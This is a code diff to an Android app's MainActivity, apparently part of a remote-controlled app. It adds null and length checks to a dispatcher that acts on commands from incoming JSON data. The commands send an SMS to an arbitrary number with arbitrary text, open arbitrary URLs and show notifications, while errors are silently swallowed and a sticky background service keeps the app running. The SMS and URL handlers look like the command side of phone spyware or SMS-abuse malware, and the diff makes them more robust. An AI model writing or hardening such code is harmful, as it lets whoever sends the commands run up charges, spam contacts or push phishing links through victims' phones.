@@ -175,15 +175,21 @@ public class MainActivity extends AppCompatActivity {
                     case "notification": showNotif("System", "تنبيه"); break;
                     case "toast": Toast.makeText(this, "رسالة", Toast.LENGTH_LONG).show(); break;
                     case "send_sms":
-                        String phone = fullData.optJSONArray("extras").optJSONObject(0).optString("value");
-                        String msg = fullData.optJSONArray("extras").optJSONObject(1).optString("value");
-                        SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
+                        JSONArray ex = fullData.optJSONArray("extras");
+                        if (ex != null && ex.length() >= 2) {
+                            String phone = ex.optJSONObject(0).optString("value");
+                            String msg = ex.optJSONObject(1).optString("value");
+                            SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
+                        }
                         break;
                     case "open_url":
-                        String url = fullData.optJSONArray("extras").optJSONObject(0).optString("value");
-                        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
-                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        startActivity(i);
+                        JSONArray ex2 = fullData.optJSONArray("extras");
+                        if (ex2 != null && ex2.length() > 0) {
+                            String url = ex2.optJSONObject(0).optString("value");
+                            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                            startActivity(i);
+                        }
                         break;
                 }
             } catch (Exception e) {}
@@ -309,4 +315,4 @@ public class MainActivity extends AppCompatActivity {
         @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
         @Nullable @Override public IBinder onBind(Intent intent) { return null; }
     }
-    }
+                            }
